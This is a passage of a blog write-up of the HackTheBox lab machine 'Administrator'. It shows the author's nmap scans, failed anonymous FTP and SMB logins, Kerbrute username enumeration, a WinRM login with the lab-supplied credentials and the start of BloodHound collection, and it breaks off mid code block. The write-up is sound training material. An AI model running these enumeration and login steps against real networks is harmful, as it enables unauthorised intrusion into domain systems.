@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Administrator&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Administrator">
+  
+    <meta name="description" content="This box is unique in that it focuses entirely on Active Directory. Unlike typical boxes in HTB, there’s no web application to look at, and domain credentials are provided from the very start. This setup simulates real-world penetration tests in a Windows/Active Directory environment, and provides an excellent opportunity for practicing AD enumeration and attacks using tools like BloodHound and Impacket scripts.">
+    <meta property="og:description" content="This box is unique in that it focuses entirely on Active Directory. Unlike typical boxes in HTB, there’s no web application to look at, and domain credentials are provided from the very start. This setup simulates real-world penetration tests in a Windows/Active Directory environment, and provides an excellent opportunity for practicing AD enumeration and attacks using tools like BloodHound and Impacket scripts.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Administrator</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Apr 20, 2025</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/1770b98a88f780cdb538f87484d86740" class="PageRoot"><h3 id="https://www.notion.so/1770b98a88f780b59678ec70159c909d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1770b98a88f780b59678ec70159c909d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1770b98a88f7808cad9cd365395bd984" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This box is unique in that it focuses entirely on Active Directory. Unlike typical boxes in HTB, there’s no web application to look at, and domain credentials are provided from the very start. This setup simulates real-world penetration tests in a Windows/Active Directory environment, and provides an excellent opportunity for practicing AD enumeration and attacks using tools like BloodHound and Impacket scripts.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780bbb4a3e046816a1623" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780169040d25646835729" class="Divider"></div><h3 id="https://www.notion.so/1770b98a88f780aaa062d22341c5a1b7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1770b98a88f780aaa062d22341c5a1b7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/1770b98a88f780f59ebdddbd31ce7fc1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/1770b98a88f78021b980f76d9e4d87a1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.85.158
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 17:52 ACDT
+Nmap scan report for 10.129.85.158
+Host is up (0.32s latency).
+Not shown: 65510 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+50102/tcp open  unknown
+50107/tcp open  unknown
+50110/tcp open  unknown
+50127/tcp open  unknown
+62369/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 76.97 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664-49667,49669,50102,50107,50110,50127,62369 10.129.85.158
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 17:59 ACDT
+Nmap scan report for 10.129.85.158
+Host is up (0.32s latency).
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-07 14:29:57Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+50102/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+50107/tcp open  msrpc         Microsoft Windows RPC
+50110/tcp open  msrpc         Microsoft Windows RPC
+50127/tcp open  msrpc         Microsoft Windows RPC
+62369/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|specialized|WAP
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2019|10|2016|7|Vista|2008 (95%), Asus embedded (85%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10:1607 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::sp1:home_premium cpe:/o:microsoft:windows_server_2008 cpe:/h:asus:rt-n56u
+Aggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1607 (89%), Microsoft Windows 10 1703 (89%), Microsoft Windows Server 2016 (89%), Microsoft Windows 10 1511 (88%), Microsoft Windows 10 1909 (87%), Microsoft Windows 10 (87%), Microsoft Windows Server 2012 or Server 2012 R2 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h00m01s
+| smb2-time: 
+|   date: 2025-01-07T14:31:01
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   319.71 ms 10.10.14.1
+2   320.12 ms 10.129.85.158
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 93.24 seconds</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f78068911fe89e554a969f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Based on the open ports it’s very obvious this is a domain controller. FTP and WinRM ports are also open, which could be useful later on.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7806cb257ff7816129e76" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The scan found the domain name as well, I’ll add it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f780eab0f6fc74c6fa8635" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># HTB machine Administrator
+10.129.85.158   administrator.htb</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7808dab49ec2a277f0525" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78002ba3bdf9e8d6d4782" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP21 — FTP:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780e78cbcf0e9d7369856" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With no valid credentials, I’ll try accessing the FTP share with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">anonymous</code></span><span class="SemanticString">, but it was unsuccessful.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7806a8a27cfadb4f7fc22" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> ftp 10.129.85.158 
+
+Connected to 10.129.85.158.
+220 Microsoft FTP Service
+Name (10.129.85.158:ch3ng): anonymous
+331 Password required
+Password: 
+530 User cannot log in.
+ftp: Login failed</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7809ab2ccf874dea6795a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78067bf9ae34ebed7e3b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP445 — SMB:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f7804a840ffd51409e669f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar results for SMB, with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">anonymous</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">guest</code></span><span class="SemanticString"> and null sessions all failing.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7809c820cececc81d6fd5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.85.158 -u &#x27;&#x27; -p &#x27;&#x27; --shares                                
+
+SMB         10.129.85.158   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.158   445    DC               [+] administrator.htb\: 
+SMB         10.129.85.158   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.85.158 -u &#x27;Anonymous&#x27; -p &#x27;&#x27; --shares
+
+SMB         10.129.85.158   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.158   445    DC               [-] administrator.htb\Anonymous: STATUS_LOGON_FAILURE 
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.85.158 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares    
+
+SMB         10.129.85.158   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         10.129.85.158   445    DC               [-] administrator.htb\guest: STATUS_ACCOUNT_DISABLED</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f780d49b11c20dee2a344b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780498a4bc685f5c52a61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP88 — Kerberos:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780c2a83bc4feb21b527d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Meanwhile, my Kerbrute scan has finished in the background, and returned a handful of accounts.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f78014b2bfee6cb13812da" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> kerbrute userenum -d administrator.htb --dc 10.129.85.158 -t 100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 01/07/25 - Ronnie Flathers @ropnop
+
+2025/01/07 18:05:48 &gt;  Using KDC(s):
+2025/01/07 18:05:48 &gt;  	10.129.85.158:88
+
+2025/01/07 18:05:49 &gt;  [+] VALID USERNAME:	 michael@administrator.htb
+2025/01/07 18:05:49 &gt;  [+] VALID USERNAME:	 Michael@administrator.htb
+2025/01/07 18:05:49 &gt;  [+] VALID USERNAME:	 benjamin@administrator.htb
+2025/01/07 18:05:54 &gt;  [+] VALID USERNAME:	 administrator@administrator.htb
+2025/01/07 18:05:54 &gt;  [+] VALID USERNAME:	 emily@administrator.htb
+2025/01/07 18:05:55 &gt;  [+] VALID USERNAME:	 MICHAEL@administrator.htb
+2025/01/07 18:05:57 &gt;  [+] VALID USERNAME:	 olivia@administrator.htb
+2025/01/07 18:05:59 &gt;  [+] VALID USERNAME:	 Benjamin@administrator.htb
+2025/01/07 18:06:02 &gt;  [+] VALID USERNAME:	 ethan@administrator.htb
+2025/01/07 18:06:33 &gt;  [+] VALID USERNAME:	 Administrator@administrator.htb
+2025/01/07 18:07:13 &gt;  [+] VALID USERNAME:	 BENJAMIN@administrator.htb
+2025/01/07 18:08:01 &gt;  [+] VALID USERNAME:	 Emily@administrator.htb
+2025/01/07 18:08:28 &gt;  [+] VALID USERNAME:	 Olivia@administrator.htb
+2025/01/07 18:09:08 &gt;  [+] VALID USERNAME:	 Ethan@administrator.htb</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7802f8f30fc87d8ebefb8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7808da19fd626ec6c22f8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ropnop/kerbrute">Kerbrute</a></span><span class="SemanticString"> is a brute-force tool that leverages Kerberos pre-authentication to enumerate valid domain usernames. In a typical Kerberos exchange, a user requests a Ticket Granting Ticket (TGT) from the Key Distribution Centre (KDC) by sending an encrypted timestamp along with its username as proof of identity. If the provided username does not exist in the domain, the KDC responds with an error message different to when the user exists but the password is incorrect. The distinction in the error messages is then leveraged by Kerbrute to identify valid accounts. A more detailed explanation of Kerberos authentication can be found in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.tarlogic.com/blog/how-kerberos-works/">this page</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780dcba4ccef0238060b4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With each of the valid usernames identified, I tried to authenticate to FTP and SMB with a blank password, but none worked.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780bf9490e9de10763364" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f78087b3aff7c0514f58b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Hidden in Plain Sight…</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f780a6ae3ad1e63ade9ba5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At this point I felt pretty lost, nothing seems exploitable. I was about to take a break and shut down the instance, and it’s only at this moment did I realize credentials were provided right from the start.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7805aa5cad9a5be6163ce" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa1c60698-64df-470c-88e5-acefd06b4ddc%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-805a-a5ca-d9a5be6163ce"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa1c60698-64df-470c-88e5-acefd06b4ddc%2Fimage.png?width=707.96875&amp;table=block&amp;id=1770b98a-88f7-805a-a5ca-d9a5be6163ce" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1770b98a88f780e8a74ac04e4fdf8964" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I was in disbelief! Foothold was simply logging in to WinRM with the provided credentials. Easy as that!</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7808fa448ee47c5469cba" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/administrator]
+└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u &#x27;Olivia&#x27; -p &#x27;ichliebedich&#x27; -i administrator.htb              
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\olivia\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+administrator\olivia</span></span></span></code></pre><div id="https://www.notion.so/1770b98a88f7800a8f0fca0750391444" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f780b99017f35865353dc0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I guess this highlights the importance of a clear head and attention to detail. I’ve wasted hours hitting a brick wall, all because I missed a single line of information at the beginning.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7803ba0daeabf734432ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1770b98a88f7808a91a0dcff2dca2328" class="Divider"></div><h3 id="https://www.notion.so/1770b98a88f780abb279d871213cb334" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1770b98a88f780abb279d871213cb334"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">olivia</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1770b98a88f780909a7cd3b1a90bbeb4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">BloodHound Enumeration:</strong></span></span></p></div><div id="https://www.notion.so/1770b98a88f78024a97cc24a838d92bb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In a typical AD setup, there are thousands of relationships and permissions between various users, groups and objects. These are often misconfigured in ways that can be exploited, but manually enumerating them is challenging due to its sheer scale and complexity. This is why </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/SpecterOps/BloodHound-Legacy">BloodHound</a></span><span class="SemanticString"> is an essential tool for AD pentests, as it visually maps out these relationships in a graph form, making it significantly easier to identify any privilege escalation paths that exists.</span></span></p></div><div id="https://www.notion.so/1770b98a88f7802f8690ef9ab9109ff6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First, I need to gather all the data for BloodHound to visualize. Since I already have valid domain creds, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bloodhound-python</code></span><span class="SemanticString"> to collect them via LDAP.</span></span></p></div><div id="https://www.notion.so/1770b98a88f780b9983df647c738d736" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Command: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bloodhound-python -u olivia -d administrator.htb -c all -v -ns 10.129.85.158</code></span></span></p></div><div id="https://www.notion.so/1770b98a88f780818d8ad4ab9903e56e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The command may take a while to run. When it’s done, 7 JSON files are created.</span></span></p></div><pre id="https://www.notion.so/1770b98a88f7807b9160dd5dbdb0337b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor 